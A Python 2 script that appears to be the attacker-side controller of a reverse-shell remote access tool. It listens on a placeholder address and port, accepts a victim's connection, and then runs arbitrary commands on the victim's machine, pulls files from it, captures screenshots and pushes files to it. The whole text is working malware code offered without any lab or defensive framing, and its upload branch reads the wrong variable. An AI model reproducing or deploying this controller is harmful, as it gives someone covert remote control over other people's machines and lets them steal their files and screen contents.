#!/usr/bin/python

import socket
import base64


def shell():
    curr_dir = target.recv(1024)
    count = 0
    while True:
        cmd = raw_input("{}~#: ".format(curr_dir))
        # Quit from client
        if cmd == "exit":
            target.send(cmd)
            break
        # change directory in client
        elif cmd[:2] == "cd":
            target.send(cmd)
            res = target.recv(1024)
            curr_dir = res
            print(res)
        elif cmd == "":
            pass
        # Download File from client
        elif cmd[:8] == "download":
            target.send(cmd)
            with open(cmd[9:], 'wb') as file_dwn:
                datos = target.recv(30000)
                file_dwn.write(base64.b64decode(datos))
        elif cmd[:10] == "screenshot":
            target.send(cmd)
            with open("screen-%d.png" % count, "wb") as screen:
                dates = target.recv(1000000)
                date_decode = base64.b64decode(dates)
                if date_decode == "fail":
                    print("Capture: Failure.")
                else:
                    screen.write(date_decode)
                    print("Capture: Success")
                    count = count + 1
        # Upload files from server to client
        elif cmd[:6] == "upload":
            try:
                target.send(cmd)
                with open(res[7:], 'rb') as file_up:
                    target.send(base64.b64encode(file_up.read()))
            except:
                print("Ha ocurrido un error al tratar de subir.")
        else:
            target.send(cmd)
            res = target.recv(1024)
            if res == "1":
                continue
            else:
                print(res)

def up_server():
    global server
    global ip
    global target

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  #Type connection and ports
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Update IP address
    server.bind(('xxx.xxx.x.xx', 1234)) # Up server with this address and port
    server.listen(1) # port listen
    
    # Print message
    print("Run server and wait connection...\n")


    # Accept any connection
    target, ip = server.accept()
    
    print("Connection from: " + str(ip[0]))

up_server()
shell()
server.close()
